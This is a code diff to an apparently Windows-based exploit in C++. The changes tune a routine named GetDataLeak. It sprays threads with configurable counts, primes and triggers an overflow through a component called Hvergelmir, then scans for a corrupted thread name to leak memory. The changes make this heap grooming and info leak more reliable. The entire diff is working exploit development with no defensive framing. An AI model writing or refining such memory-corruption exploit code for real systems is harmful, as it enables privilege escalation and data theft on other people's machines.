@@ -2,6 +2,7 @@
 #include "ThreadNameManager.h"
 #include "functions.h"
 #include "Hvergelmir.h"
+#include "config.h"
 #include <memory>
 
 // Global guard for maximum leak buffer allocation in this translation unit
@@ -9,6 +10,17 @@ static const size_t THREADNAME_MAX_LEAK = 64 * 1024 * 1024; // 64 MB
 
 // exitEvent is created once in the constructor to ensure proper error handling
 static HANDLE exitEvent = NULL;
+
+// Tunables (can be overridden in config.h)
+#ifndef THREADNAME_THREAD_COUNT_BASE
+#define THREADNAME_THREAD_COUNT_BASE 768
+#endif
+#ifndef THREADNAME_THREAD_COUNT_STEP
+#define THREADNAME_THREAD_COUNT_STEP 128
+#endif
+#ifndef THREADNAME_THREAD_SLEEP_MS
+#define THREADNAME_THREAD_SLEEP_MS 50
+#endif
 
 DWORD WINAPI DummyThread(LPVOID lpParam) {
 	// Wait on event; if event handle is invalid just exit
@@ -79,11 +91,13 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 	{
 		// create half the threads before priming and the remainder after to mimic
 		// previous behavior while scaling counts
-
-		CreateThreads(3000);
+		UINT64 threadTarget = (UINT64)(THREADNAME_THREAD_COUNT_BASE + (i * THREADNAME_THREAD_COUNT_STEP));
+		if (threadTarget < 256) threadTarget = 256; // minimal safety floor
+		CreateThreads(threadTarget);
 		Hvergelmir::getInstance().PrimeOverflow(iChunkSize);
 
-		Sleep(200);
+		// Shorter delay improves overall runtime while preserving layout stability
+		Sleep(THREADNAME_THREAD_SLEEP_MS);
 		Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);
 
 		leakThread = ScanForCorruptName();
